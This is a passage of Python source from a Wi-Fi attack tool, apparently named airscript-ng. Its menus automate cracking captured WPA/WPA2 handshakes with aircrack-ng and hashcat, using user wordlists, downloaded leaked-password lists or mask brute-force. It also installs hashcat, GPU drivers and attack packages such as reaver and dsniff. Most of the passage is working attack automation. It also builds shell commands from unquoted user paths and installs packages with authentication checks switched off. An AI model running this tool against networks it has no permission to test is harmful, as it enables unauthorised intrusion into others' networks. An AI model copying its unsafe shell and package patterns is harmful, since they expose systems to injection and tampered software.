         ██████╗██████╗  █████╗  ██████╗██╗  ██╗        ██████╗ █████╗ ██████╗ 
        ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝       ██╔════╝██╔══██╗██╔══██╗
        ██║     ██████╔╝███████║██║     █████╔╝        ██║     ███████║██████╔╝
        ██║     ██╔══██╗██╔══██║██║     ██╔═██╗        ██║     ██╔══██║██╔═══╝ 
        ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗    ██╗╚██████╗██║  ██║██║     
         ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     

        
                    """)
            print("\nType [1] - Crack the WPA-HANDSHAKE with CPU")
            print("Type [2] - Crack the WPA-HANDSHAKE with GPU (Much faster)")
            print("\n\nType [99] - Return to menu")
            global cpugpu
            cpugpu = input("\n|MENU|PRE-EXISTING_HANDSHAKE|(ENTER CHOICE) ~# ")
            if cpugpu != "":
                break
        cpugpu = str(cpugpu)
        if cpugpu == "1": #CPU CRACK SECTION
            from tkinter.filedialog import askopenfilename, Tk as capture
            import subprocess
            capture().withdraw()
            global cpucrack
            somepath = input("\nPlease specify a .cap file. (press enter) ~# ")
            cpucrack = askopenfilename()
            cpucrack = str(cpucrack)
            print("\n[CAP FILE]: %s" %(cpucrack))
            input("\nPlease specify a Wordlist. (press enter) ~# ")
            wordcrack = askopenfilename()
            wordcrack = str(wordcrack)
            try:
                subprocess.call("aircrack-ng %s -w %s" %(cpucrack,wordcrack),shell=True)
                #subprocess.call("/bin/bash -c \"aircrack-ng %s -w %s\"" %(cpucrack,wordcrack),shell=True)
            except(KeyboardInterrupt,EOFError):
                subprocess.call("kill $(ps aux | grep -i \"aircrack-ng\" | awk -F ' ' {'print $2'}) 2>/dev/null", shell=True)
                print("Recieved TERMINATE signal, quitting...")
                os._exit(1)
            print("\n")
            os._exit(1)
        elif cpugpu == "2": #GPU CRACK SECTION
            from tkinter import filedialog
            from tkinter.filedialog import askopenfilename, Tk as captured
            captured().withdraw()
            global gpucrack
            somepath = input("\nPlease specify a .cap file. Must not be cleaned with WPACLEAN or such. (press enter) ~# ")
            gpucrack = askopenfilename()
            gpucrack = str(gpucrack)
            print("\n[CAP FILE]: %s" %(gpucrack))
            while True:
                hcatinstalled = input("\nHave you installed hashcat and the drivers using option [6] from the menu? [y/n] ~# ")
                if hcatinstalled.lower().startswith("n"):
                    hashcatdownloadfunc()
                    driverdownloadfunc()
                    os.system("clear")
                    drifunc()
                    break
                if hcatinstalled.lower().startswith("y"):
                    break
                else:
                    os.system("clear")
                    continue
            input("\nWhere is the hashcat directory? Not hashcat-utils! EG: click inside the hashcat-3.x-x folder and press ok. (press enter) ~# ")
            global hcatpath
            captured().withdraw()
            hcatpath = filedialog.askdirectory()
            hcatpath = str(hcatpath)
            def hcatfunc():
                global mainwordlist
                mainwordlist = "N/A"
                os.system("clear")
                print("""

     ██████╗██████╗  █████╗  ██████╗██╗  ██╗        ██████╗ █████╗ ██████╗ 
    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝       ██╔════╝██╔══██╗██╔══██╗
    ██║     ██████╔╝███████║██║     █████╔╝        ██║     ███████║██████╔╝
    ██║     ██╔══██╗██╔══██║██║     ██╔═██╗        ██║     ██╔══██║██╔═══╝ 
    ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗    ██╗╚██████╗██║  ██║██║     
     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     
        
                    """)
                print("\n[CAP FILE]: %s" %(gpucrack))
                print("[HASHCAT PATH]: %s" %(hcatpath))
                print("[WORDLIST]: %s" %(mainwordlist))
                def hfinal():
                    os.system("clear")
                    print("""

     ██████╗██████╗  █████╗  ██████╗██╗  ██╗        ██████╗ █████╗ ██████╗ 
    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝       ██╔════╝██╔══██╗██╔══██╗
    ██║     ██████╔╝███████║██║     █████╔╝        ██║     ███████║██████╔╝
    ██║     ██╔══██╗██╔══██║██║     ██╔═██╗        ██║     ██╔══██║██╔═══╝ 
    ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗    ██╗╚██████╗██║  ██║██║     
     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     

                        """)
                    print("\n[CAP FILE]: %s" %(gpucrack))
                    print("[HASHCAT PATH]: %s" %(hcatpath))
                    print("[HASHCAT-UTILS PATH]: %s" %(hcatutilspath))
                    print("[WORDLIST]: %s" %(mainwordlist))
                    print("[ATTACK MODE]: %s" %(ackmode))
                    print("[TEMPERATURE RETAIN]: %s" %(retaingputemp))
                    print("[TEMPERATURE ABORT]: %s" %(maxgputemp))
                if mainwordlist == "N/A":
                    global ackmode
                    global hcatutilspath
                    global maxgputemp
                    global retaingputemp
                    print("\nWordlist not chosen yet. Your options are:")
                    print("\nType [1] - Choose a wordlist/dictionary and start cracking.")
                    print("Type [2] - Use keyspace brute-force, no wordlist needed")
                    print("Type [3] - Use a built-in wordlists, from Skull-security")
                    print("\n\nType [99] - Return to menu ")
                    global critchoice
                    critchoice = input("\nEnter choice ~# ")
                    if critchoice == "1":
                        ackmode = "Standard user-chosen wordlist"
                        input("\nReady to choose a Wordlist?. (press enter) ~# ")
                        mainwordlist = askopenfilename()
                        mainwordlist = str(mainwordlist)
                        input("Please locate and click inside the Hashcat-utils directory. Remember to click inside and press ok! (press enter) ~# ")
                        hcatutilspath = filedialog.askdirectory()
                        hcatutilspath = str(hcatutilspath)
                        while True:
                            retaingputemp = input("What temperature do you want to retain? (degress celsius) ~# ")
                            maxgputemp = input("What should be the cutoff/maximum temperature limit? (degress celsius) ~# ")
                            retaingputemp = int(retaingputemp)
                            maxgputemp = int(maxgputemp)
                            if retaingputemp < 80 and maxgputemp < 85:
                                retaingputemp = str(retaingputemp)
                                maxgputemp = str(maxgputemp)
                                break
                            else:
                                retaingputemp = str(retaingputemp)
                                maxgputemp = str(maxgputemp)
                                print("\nTemperature value inappropriate! Please input proper and safe values. [<85c for retain  and <90c for max]")
                                continue
                        hfinal()
                        if os.system("ls ~/.airscriptNG/ >/dev/null") != 0:
                            os.system("mkdir ~/.airscriptNG/ 2>/dev/null")
                        if input("\nOptions correctly chosen? Start cracking? [y/n] ~# ").lower().startswith("y"):
                            if os.system("ls ~/.airscriptNG/HANDSHAKEFILE >/dev/null 2>/dev/null") != 0:
                                os.system("touch ~/.airscriptNG/HANDSHAKEFILE")
                            os.system("cd %s/src/ && ./cap2hccapx.bin %s ~/.airscriptNG/HANDSHAKEFILE && cd %s/ && ./hashcat64.bin -a 0 -m 2500 ~/.airscriptNG/HANDSHAKEFILE %s --gpu-temp-retain=%s --gpu-temp-abort=%s -D 2 && echo '\n\nHere is any cracked hashes:' && cat %s/hashcat.potfile && echo '\n'" %(hcatutilspath,gpucrack,hcatpath,mainwordlist,retaingputemp,maxgputemp,hcatpath))
                            os.system("rm ~/.airscriptNG/HANDSHAKEFILE 2>/dev/null")
                            os._exit(1)
                        else:
                            title()
                    elif critchoice == "2":
                        ackmode = "Keyspace bruteforce"
                        mainwordlist = str("Not applicable")
                        input("\nPlease locate and click inside the Hashcat-utils directory. Remember to click inside and press ok! (press enter) ~# ")
                        hcatutilspath = filedialog.askdirectory()
                        hcatutilspath = str(hcatutilspath)
                        #PROVIDE OPTIONS TO VIEW KEYSPACE TABLE HERE
                        if os.system("ls ~/.airscriptNG/ >/dev/null") != 0:
                            os.system("mkdir ~/.airscriptNG/ 2>/dev/null")
                        if os.system("ls ~/.airscriptNG/Dependencies-for-Airscript-ng/router-keyspaces.txt >/dev/null 2>/dev/null") != 0:
                            os.system("cd ~/.airscriptNG/ && git clone https://github.com/Sh3llcod3/Dependencies-for-Airscript-ng.git")
                        while True:
                            os.system("clear")
                            print("\nTo brute-force the keyspace, you need to enter a mask/charset.")
                            print("\nType [1] - I understand what a hashcat mask/charset is and want to proceed.")
                            print("Type [2] - What is a mask/charset? How do I enter one? View documentation.")
                            readchoices = input("\nEnter choice ~# ")
                            if readchoices == "1":
                                break
                            if readchoices == "2":
                                os.system("cat ~/.airscriptNG/Dependencies-for-Airscript-ng/router-keyspaces.txt | less")
                                continue
                        while True:
                            os.system("clear")
                            print("""
    - [ Built-in Charsets ] -

      ? | Charset
     ===+=========
      l | abcdefghijklmnopqrstuvwxyz
      u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
      d | 0123456789
      h | 0123456789abcdef
      H | 0123456789ABCDEF
      s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
      a | ?l?u?d?s
      b | 0x00 - 0xff

    """)
                            print("This is a very crucial step. If you are confused, type [help] to view the documentation again.")
                            global mainhashmask 
                            mainhashmask = input("\nPlease enter a Mask/Charset. For example:?u?u?u?u?u?u?u?u or ABCD?u?u?u?u ~# ")
                            if mainhashmask.lower().startswith("help"):
                                os.system("cat ~/.airscriptNG/Dependencies-for-Airscript-ng/router-keyspaces.txt | less")
                                continue
                            if mainhashmask != "":
                                break
                            else:
                                continue
                        while True:
                            retaingputemp = input("What temperature do you want to retain? (degress celsius) ~# ")
                            maxgputemp = input("What should be the cutoff/maximum temperature limit? (degress celsius) ~# ")
                            retaingputemp = int(retaingputemp)
                            maxgputemp = int(maxgputemp)
                            if retaingputemp < 80 and maxgputemp < 85:
                                retaingputemp = str(retaingputemp)
                                maxgputemp = str(maxgputemp)
                                break
                            else:
                                retaingputemp = str(retaingputemp)
                                maxgputemp = str(maxgputemp)
                                print("\nTemperature value inappropriate! Please input proper and safe values. [<80c for retain  and <85c for max]")
                                continue
                        hfinal()
                        print("[INPUT MASK/CHARSET]: %s" %(mainhashmask))
                        if os.system("ls ~/.airscriptNG/ >/dev/null 2>/dev/null") != 0:
                            os.system("mkdir ~/.airscriptNG/ 2>/dev/null")
                        if input("\nOptions correctly chosen? Start cracking? [y/n] ~# ").lower().startswith("y"):
                            if os.system("ls ~/.airscriptNG/HANDSHAKEFILE >/dev/null 2>/dev/null") != 0:
                                os.system("touch ~/.airscriptNG/HANDSHAKEFILE")
                            os.system("cd %s/src/ && ./cap2hccapx.bin %s ~/.airscriptNG/HANDSHAKEFILE && cd %s/ && ./hashcat64.bin -a 3 -m 2500 ~/.airscriptNG/HANDSHAKEFILE %s --gpu-temp-retain=%s --gpu-temp-abort=%s -D 2 && echo '\n\nHere is any cracked hashes:' && cat %s/hashcat.potfile && echo '\n'" %(hcatutilspath,gpucrack,hcatpath,mainhashmask,retaingputemp,maxgputemp,hcatpath))
                            os.system("rm ~/.airscriptNG/HANDSHAKEFILE 2>/dev/null")
                            os.system("rm -r ~/.airscriptNG/Dependencies-for-Airscript-ng/ 2>/dev/null")
                            os.system("rm %s/hashcat.potfile %s/hashcat.log" %(hcatpath,hcatpath))
                            os._exit(1)
                        #End here
                        hfinal()
                    elif critchoice == "3":
                        ackmode = "Built-in wordlist"
                        mainwordlist = str(mainwordlist)
                        input("\nPlease locate and click inside the Hashcat-utils directory. Remember to click inside and press ok! (press enter) ~# ")
                        hcatutilspath = filedialog.askdirectory()
                        hcatutilspath = str(hcatutilspath)
                        while True:
                            os.system("clear")
                            print("\nPlease choose a built-in wordlist: ")
                            print("\nType [1] - Rockyou.txt ~15 Million lines, Skull security")
                            print("Type [2] - Phpbb.txt, Skull security")
                            print("Type [3] - Top 1350~ WPA/WPA2 list, from me")
                            readwordlist = input("\nEnter choice ~# ")
                            global onlinelist
                            if os.system("ls ~/.airscriptNG/Wordlists/ >/dev/null 2>/dev/null") != 0:
                                    os.system("mkdir ~/.airscriptNG/Wordlists/")
                            if readwordlist == "1":
                                if os.system("ls ~/.airscriptNG/Wordlists/rockyou.txt.bz2 2>/dev/null >/dev/null") != 0 and os.system("ls ~/.airscriptNG/Wordlists/rockyou.txt 2>/dev/null >/dev/null") != 0:
                                    os.system("cd ~/.airscriptNG/Wordlists/ && wget http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2 && bzip2 -d rockyou.txt.bz2")
                                onlinelist = "~/.airscriptNG/Wordlists/rockyou.txt"
                                break
                            elif readwordlist == "2":
                                if os.system("ls ~/.airscriptNG/Wordlists/phpbb.txt.bz2 2>/dev/null >/dev/null") != 0 and os.system("ls ~/.airscriptNG/Wordlists/phpbb.txt 2>/dev/null >/dev/null") != 0:
                                    os.system("cd ~/.airscriptNG/Wordlists/ && wget http://downloads.skullsecurity.org/passwords/phpbb.txt.bz2 && bzip2 -d phpbb.txt.bz2")
                                onlinelist = "~/.airscriptNG/Wordlists/phpbb.txt"
                                break
                            elif readwordlist == "3":
                                if os.system("ls ~/.airscriptNG/Dependencies-for-Airscript-ng/ 2>/dev/null >/dev/null"):
                                    os.system("cd ~/.airscriptNG/ && git clone https://github.com/Sh3llcod3/Dependencies-for-Airscript-ng.git")
                                onlinelist = "~/.airscriptNG/Dependencies-for-Airscript-ng/Small-wpa-list"
                                break
                            else:
                                continue
                        mainwordlist = str(onlinelist)
                        while True:
                            retaingputemp = input("What temperature do you want to retain? (degress celsius) ~# ")
                            maxgputemp = input("What should be the cutoff/maximum temperature limit? (degress celsius) ~# ")
                            retaingputemp = int(retaingputemp)
                            maxgputemp = int(maxgputemp)
                            if retaingputemp < 80 and maxgputemp < 85:
                                retaingputemp = str(retaingputemp)
                                maxgputemp = str(maxgputemp)
                                break
                            else:
                                retaingputemp = str(retaingputemp)
                                maxgputemp = str(maxgputemp)
                                print("\nTemperature value inappropriate! Please input proper and safe values. [<80c for retain  and <85c for max]")
                                continue
                        hfinal()
                        if input("\nOptions correctly chosen? Start cracking? [y/n] ~# ").lower().startswith("y"):
                            if os.system("ls ~/.airscriptNG/HANDSHAKEFILE >/dev/null 2>/dev/null") != 0:
                                os.system("touch ~/.airscriptNG/HANDSHAKEFILE")
                            os.system("cd %s/src/ && ./cap2hccapx.bin %s ~/.airscriptNG/HANDSHAKEFILE && cd %s/ && ./hashcat64.bin -a 0 -m 2500 ~/.airscriptNG/HANDSHAKEFILE %s --gpu-temp-retain=%s --gpu-temp-abort=%s -D 2 && echo '\n\nHere is any cracked hashes:' && cat %s/hashcat.potfile && echo '\n'" %(hcatutilspath,gpucrack,hcatpath,mainwordlist,retaingputemp,maxgputemp,hcatpath))
                            os.system("rm ~/.airscriptNG/HANDSHAKEFILE 2>/dev/null")
                            os.system("rm -r ~/.airscriptNG/Dependencies-for-Airscript-ng/ 2>/dev/null")
                            os.system("rm %s/hashcat.potfile %s/hashcat.log" %(hcatpath,hcatpath))
                            os._exit(1)
                        hfinal()
                    elif critchoice == "99":
                        title()
                    else:
                        hcatfunc()
            hcatfunc()
            #FINISH THIS PART 
        elif cpugpu == "99":
            title()
        else:
            handshake_func()
    except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError,ValueError):
        import os,subprocess
        subprocess.call("kill $(ps aux | grep -i \"aircrack-ng\" | awk -F ' ' {'print $2'}) 2>/dev/null", shell=True)
        os.system("clear")
        os._exit(1)
    #Finish here
    #WILL BE THE GO-TO PLACE TO CRACK AN EXISTING WPA/WPA2 HANDSHAKE, OPTIONS FOR USE WITH AIRCRACK, HASHCAT, GENPMK, COWPAWTTY, AIROLIB-NG MUST BE SUPPORTED!
def unaliasfunc(): #FIXES APPLIED, WITH SOME SACIFICE, REVIEW FINAL CODE.
    print("\nScrewed up terminal in some unusual way?")
    def helpme():
        import os
        global unfunc
        unfunc = input("\n|MENU|REMOVE_ALIAS|We gotcha' covered! remove commands from system? [y/n] >>")
        if unfunc == "":
            os.system('clear')
            helpme()
        elif unfunc.lower().startswith("n"):
            title()
        elif unfunc.lower().startswith("y"):
            if os.system("ls ~/.airscriptNG/bash_backup/bashrc-* 2>/dev/null >/dev/null") == 0:
                os.system("clear")
                print("\n")
                os.system("echo Backup file found from $(ls ~/.airscriptNG/bash_backup/ | sort | awk -F '-' {'print $2'})")
                if input("Restore? [y/n] >>").lower().startswith("y"):
                    print("\n[+]Restoring bash resource!")
                    if os.system("cp ~/.airscriptNG/bash_backup/bashrc-* ~/.bash_aliases && /bin/bash -c \"source ~/.bashrc\" 2>/dev/null") == 0:
                        print("[+]Restored successfully!\n")
                        os._exit(1)
                    else:
                        input("\n[-]Problems occured. Press enter to return to menu >>")
                        title()
                else:
                    os.system("clear")
                    title()
            else:
                def bork():
                    print("\nNo Backup file found!")
                    print("If terminal is borked type 'reset' ")
                    print("If still having problems, just remove any aliases at the end of ~/.bash_aliases file to do with 'airscript-ng'!")
                    if input("\n\nType [ok] to return to menu >>").lower().startswith("ok"):
                        title()
                    else:
                        os.system("clear")
                        bork()
                bork()
    helpme()
def driverdownloadfunc(): #DOWNLOADS THE DRIVERS FROM BROWSER
    import webbrowser, os
    def funtimes():
        print("""

 ██████╗ ██████╗ ███████╗███╗   ██╗ ██████╗██╗         ██████╗ ██████╗ ██╗██╗   ██╗███████╗██████╗ ███████╗
██╔═══██╗██╔══██╗██╔════╝████╗  ██║██╔════╝██║         ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔══██╗██╔════╝
██║   ██║██████╔╝█████╗  ██╔██╗ ██║██║     ██║         ██║  ██║██████╔╝██║██║   ██║█████╗  ██████╔╝███████╗
██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║██║     ██║         ██║  ██║██╔══██╗██║╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║
╚██████╔╝██║     ███████╗██║ ╚████║╚██████╗███████╗    ██████╔╝██║  ██║██║ ╚████╔╝ ███████╗██║  ██║███████║
 ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝
                                                                                                           
""")
        global gpufun
        gpufun = input("|MENU|POST_CRACK|GPU|DRIVER_DOWNLOAD|(Do you have an Nvidia GPU or AMD GPU? [a/n]) ~# ")
        if gpufun.lower().startswith("n"):
            os.system("clear")
            print("A browser page will open, download the newest drivers from the archive.")
            webbrowser.open('http://www.nvidia.com/object/linux-amd64-display-archive.html')
            print("Once you have downloaded your driver of choice, Install it using the menu option (Re-run the program).")
            os._exit(1)
        elif gpufun.lower().startswith("a"):
            os.system("clear")
            print("A browser page will open, choose your drivers from there.")
            webbrowser.open('http://support.amd.com/en-us/download')
            print("Once you have downloaded your driver of choice, Install it using the menu option (Re-run the program).")
            os._exit(1)
    funtimes()   
def hashcatdownloadfunc(): #GIT CLONES AND MAKE-BUILDs HASHCAT!
    import os, webbrowser, time
    from tkinter import filedialog
    from tkinter import Tk
    os.system("clear")
    print("""
    
              a          a
             aaa        aaa
            aaaaaaaaaaaaaaaa
           aaaaaaaaaaaaaaaaaa
          aaaaafaaaaaaafaaaaaa
          aaaaaaaaaaaaaaaaaaaa
           aaaaaaaaaaaaaaaaaa
            aaaaaaa  aaaaaaa
             aaaaaaaaaaaaaa
  a         aaaaaaaaaaaaaaaa
 aaa       aaaaaaaaaaaaaaaaaa
 aaa      aaaaaaaaaaaaaaaaaaaa
 aaa     aaaaaaaaaaaaaaaaaaaaaa
 aaa    aaaaaaaaaaaaaaaaaaaaaaaa
  aaa   aaaaaaaaaaaaaaaaaaaaaaaa
  aaa   aaaaaaaaaaaaaaaaaaaaaaaa
  aaa    aaaaaaaaaaaaaaaaaaaaaa
   aaa    aaaaaaaaaaaaaaaaaaaa
    aaaaaaaaaaaaaaaaaaaaaaaaaa
     aaaaaaaaaaaaaaaaaaaaaaaaa

██╗  ██╗ █████╗ ███████╗██╗  ██╗ ██████╗ █████╗ ████████╗    
██║  ██║██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗╚══██╔══╝       
███████║███████║███████╗███████║██║     ███████║   ██║       
██╔══██║██╔══██║╚════██║██╔══██║██║     ██╔══██║   ██║       
██║  ██║██║  ██║███████║██║  ██║╚██████╗██║  ██║   ██║       
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝                                                                   

""")
    if input("Download and setup hashcat for GPU-WPA cracking? [y/n] >> ").lower().startswith("y"):
        os.system("clear")
        print("\nWhere would you like hashcat installed?")
        input("\n|MENU|POST_CRACK|GPU|HASHCAT_DOWNLOAD|(Please delete any older versions and press enter to choose directory) >>")
        global hashpath
        Tk().withdraw()
        hashpath = filedialog.askdirectory()
        hashpath = str(hashpath)
        print("\nA browser window will now open. ALT+TAB back to the terminal")
        time.sleep(3)
        webbrowser.open("https://hashcat.net/")
        #print("Please right-click and copy/paste link location on the button next to hashcat binaries")
        downloadpath = input("\nPlease paste the URL/ADDRESS/LINK-LOCATION of the hashcat binaries download button EG:https://hashcat.net/files/hashcat-3.6.0.7z ~# ")
        os.system("sudo apt install p7zip p7zip-full -y;cd %s;wget %s;7z x hashcat-*;git clone https://github.com/hashcat/hashcat-utils.git;cd hashcat-utils/src/;make" %(hashpath, downloadpath))
        #os.system("cd %s;git clone https://github.com/hashcat/hashcat.git;cd hashcat/;git submodule update --init;make;cd ..;git clone https://github.com/hashcat/hashcat-utils.git;cd hashcat-utils/src/;make" %(hashpath))
        os.system("\necho '[+] Hashcat is now ready to use, it will be inside the folder you chose ' ")
        os._exit(1)
    else:
        title()
def drifunc(): #Installs downloaded drivers
    import os
    from tkinter.filedialog import askopenfilename, Tk as snak
    snak().withdraw()
    def Nvidia():
        os.system("clear")
        global nvenc
        path = input("Please select where the NVIDIA driver file is located. Press enter (you may have to answer yes to some options) ~# ")
        nvenc = askopenfilename()
        nvenc = str(nvenc)
        os.system("clear")
        input("\n|MENU|POST_CRACK|GPU|DRIVER_INSTALL|NVIDIA|(Please remove any previous drivers/driver downloads and hit enter) ~# ")
        os.system("cd %s;sudo ./NVIDIA-Linux*" %(nvenc))
        print("echo NVIDIA driver is installed!")
        print("now reboot, if you see any error, please head to: 'https://goo.gl/f1GU1F'")
    def AMD():
        os.system("clear")
        from tkinter import filedialog
        from tkinter import Tk
        global AMDlol 
        AMDlol = input("Please select the folder where the AMD driver tar.xz file is located. Press enter ~# ")
        AMDlol = filedialog.askdirectory()
        AMDlol = str(AMDlol)
        os.system("clear")
        input("\n|MENU|POST_CRACK|GPU|DRIVER_INSTALL|AMD|(Please remove any previous drivers/driver downloads and hit enter) ~# ")
        os.system("cd %s;tar -Jxvf amdgpu-pro*;cd amdgpu-pro*;./amdgpu-pro-install -y" %(AMDlol))
        print("echo AMD driver is installed!")
        print("now reboot, if you see any error, type: 'amdgpu-pro-uninstall' and reboot.")
    print("""

██╗███╗   ██╗███████╗████████╗ █████╗ ██╗     ██╗         ██████╗ ██████╗ ██╗██╗   ██╗███████╗██████╗ ███████╗
██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██║         ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔══██╗██╔════╝
██║██╔██╗ ██║███████╗   ██║   ███████║██║     ██║         ██║  ██║██████╔╝██║██║   ██║█████╗  ██████╔╝███████╗
██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██║         ██║  ██║██╔══██╗██║╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║
██║██║ ╚████║███████║   ██║   ██║  ██║███████╗███████╗    ██████╔╝██║  ██║██║ ╚████╔╝ ███████╗██║  ██║███████║
╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝
                                                                                                              

""")
    print("This is the driver installation screen. Your options are:")
    print("\n\nType [1] - Install the NVIDIA-LINUX driver for Hashcat (NVIDIA GTX 900,10 Series)")
    print("Type [2] - Install the AMDGPU-PRO driver to use Hashcat with an AMD gpu (MOST GPUs, check hashcat.net)")
    sel = input("\n|MENU|POST_CRACK|GPU|DRIVER_INSTALL|(Type number) >>")
    if sel == "":
        drifunc()
    if sel == "1":
        Nvidia()
    if sel == "2":
        AMD()
def aliasfunc(): #FIXES APPLIED, WITH SOME SACIFICE, REVIEW FINAL CODE.
    import os
    os.system("clear")
    if input("\n\nAdd Airscript-ng commands to system? (append alias to ~/.bash_aliases)? [y/n] >").lower().startswith("y"):
        os.system('clear')
        if os.system("ls .airscriptNG/bash_backup/ 2>/dev/null >/dev/null") != 0:
            if os.system("mkdir -p ~/.airscriptNG/bash_backup/ 2>/dev/null") == 0:
                if os.system("ls ~/.bash_aliases 2>/dev/null >/dev/null") == 0:
                    if os.system("ls ~/.airscriptNG/bash_backup/bashrc-* 2>/dev/null >/dev/null") != 0:
                        os.system("cp ~/.bash_aliases ~/.airscriptNG/bash_backup/bashrc-$(date | awk -F ' ' {'print $1,$2,$3,$6'} | tr -d '[:space:]' | sort) 2>/dev/null ")
                else:
                    pass
        print("\n\nPlease choose location of where you have the airscript-ng.py file. ")
        print("please note though that removing or modifying the script could result in disaster. Use the remove_alias option before doing so!")
        input("\n|MENU|INSTALL_ALIAS|Press enter to continue >>")
        from tkinter.filedialog import askopenfilename, Tk as pwned
        pwned().withdraw()
        global zcat
        zcat = askopenfilename()
        zcat = str(zcat)
        os.system("echo \"alias airscript-ng='python3 %s'\" >> ~/.bash_aliases && /bin/bash -c \"source ~/.bashrc\" " %(zcat))
        print("\nAlias has been successfully added to ~/.bash_aliases.")
        print("Invoke this script from anywhere by typing \"airscript-ng\" as the root user, now re-open this terminal!\n")
        os._exit(1)
    else:
        os.system("clear")
        title()
def depandancies(): #This is fine 
    import os,time,subprocess
    print("[-] Updating system and installing some dependancies. Please hold!")
    if subprocess.call('/usr/bin/env ping -c1 8.8.8.8 >/dev/null 2>/dev/null',shell=True) == 0:
        os.system("echo '[-] 25% done';sudo apt update --allow-unauthenticated 2>/dev/null && echo '[-] 50% done' && sudo apt install xterm -y --allow-unauthenticated >/dev/null 2>/dev/null")
        os.system("xterm $HOLD -title 'Installing any dependancies [airscript-ng]'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'sudo apt install gawk reaver aircrack-ng wireless-tools ethtool apt-transport-https iproute2 git isc-dhcp-server python3-tk driftnet dsniff bzip2 apache2 gnome-terminal hostapd psmisc coreutils -y --allow-unauthenticated && update-rc.d isc-dhcp-server disable && update-rc.d apache2 disable'")
    else:
        print('\n%s[-]%s Failed to install inital dependancies, please connect to the internet and try again\n' %(col.fail,col.endl))
        os._exit(1)
    time.sleep(2)
def check_depends(): #Still works
    import os,time
    x = os.system("dpkg -s xterm gawk reaver aircrack-ng wireless-tools ethtool apt-transport-https iproute2 git isc-dhcp-server python3-tk dsniff driftnet bzip2 gnome-terminal apache2 hostapd psmisc coreutils 2>/dev/null >/dev/null")
    if x == 0:
        pass
    else:
        depandancies()
    #array = ["xterm","gawk","reaver","aircrack-ng","wireless-tools","ethtool","apt-transport-https","iproute2","git","isc-dhcp-server","python3-tk","dsniff","driftnet"]
    #for i in array[0:len(array)]:
    #    x = os.system("dpkg -s %s 2>/dev/null > /dev/null" %(i))
    #    if x == 0:
    #        pass
    #    else:
    #        depandancies()
def clearScreen(): #This is fine too but devise not defined fix
    import os
    dcl = input("[i] Press 'y' to perform cleanup or 'clear' to clean out residual files >>")
    if dcl.lower().startswith("y"):
        print("\n[info] Wait a few seconds, cleaning up...")
        os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
        os.system("sudo systemctl start NetworkManager.service")
        os.system("sudo systemctl start wpa_supplicant.service")
        os.system("clear")
        if input("\n[-] Press [y] to exit or any other key to return to start>>").lower().startswith("y"):
            os.system("rm log.txt 2>/dev/null")
            os._exit(1)
        else:
            os.system("clear")
            title()
            os.system("rm log.txt 2>/dev/null")
    if dcl.lower().startswith("clear"):
        os.system("rm ~/.airscriptNG/ -rf 2>/dev/null >/dev/null")
        input("\n\nDone. Hit enter ~# ")
        print("\n[info] Wait a few seconds, cleaning up...")
        os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
        os.system("sudo systemctl start NetworkManager.service")
        os.system("sudo systemctl start wpa_supplicant.service")
        os.system("clear")
        title()
    else:
        clearScreen()
def revert(): #revert repos is fine until apt-add solution is devised
    import os
    if os.system("ls -a backup-repos >> log.txt") == 0:
        os.system("sudo cp backup-repos/sources.list /etc/apt/sources.list")
        print("Successfully reverted repo back to what it was!")
        os.system("sudo apt update")
        print("If you don't see errors above then SOURCES file is ok.")
        clearScreen()
    else:
        print("Backup file not found!")
        clearScreen()
def install_deps(): #Needs a little bit of work
    import os
    os.system("clear")
    print("[+] This option will append a few lines to your '/etc/apt/sources.list' file.")
    print("[info] After this the program will update the apt repos and install the dependancies")
    print("[-] Please, Please remember that this option is extremely dangerous, it can corrupt your install (proceed at your own risk)!")
    tf = input("[?] Press [y] to proceed or CTRL+C to exit. >>")
    if tf.lower().startswith("y"):
        if os.system("iwconfig monitor 2>/dev/null") == 0:
            os.system("iw dev monitor del")
        else:
            pass
        if os.system("ls -a /etc/apt/sources.list >> log.txt") == 0:
            if os.system("ls -a backup-repos >> log.txt 2>/dev/null") !=0:   
                os.system("sudo mkdir backup-repos;cd backup-repos;cp /etc/apt/sources.list ./")
                com = os.system("sudo echo '#This line was added by airscript-ng, remove the line below if problems occur' >> /etc/apt/sources.list") 
